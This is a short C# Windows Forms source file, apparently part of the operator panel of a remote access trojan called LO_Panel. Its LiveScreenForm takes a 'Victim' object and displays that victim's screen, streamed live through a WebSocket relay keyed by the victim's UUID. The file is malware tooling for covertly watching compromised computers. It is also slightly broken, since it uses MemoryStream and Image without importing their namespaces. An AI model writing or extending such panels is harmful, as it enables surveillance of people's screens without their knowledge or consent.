using System;
using System.Windows.Forms;
using LO_Panel.Services;
using LO_Panel.Models;

namespace LO_Panel.Forms
{
    public partial class LiveScreenForm : Form
    {
        private Victim victim;
        private WebSocketService ws;
        private PictureBox pbScreen;
        
        public LiveScreenForm(Victim v, WebSocketService websocket)
        {
            victim = v;
            ws = websocket;
            InitializeComponent();
            
            pbScreen = new PictureBox { Dock = DockStyle.Fill, SizeMode = PictureBoxSizeMode.Zoom };
            Controls.Add(pbScreen);
            
            // Connect to WebSocket relay
            ws.OnFrame += (frameData) => {
                using (var ms = new MemoryStream(frameData))
                {
                    pbScreen.Image = Image.FromStream(ms);
                }
            };
            ws.Connect($"wss://127.0.0.1:8443/ws/screen/{v.UUID}");
        }
    }
}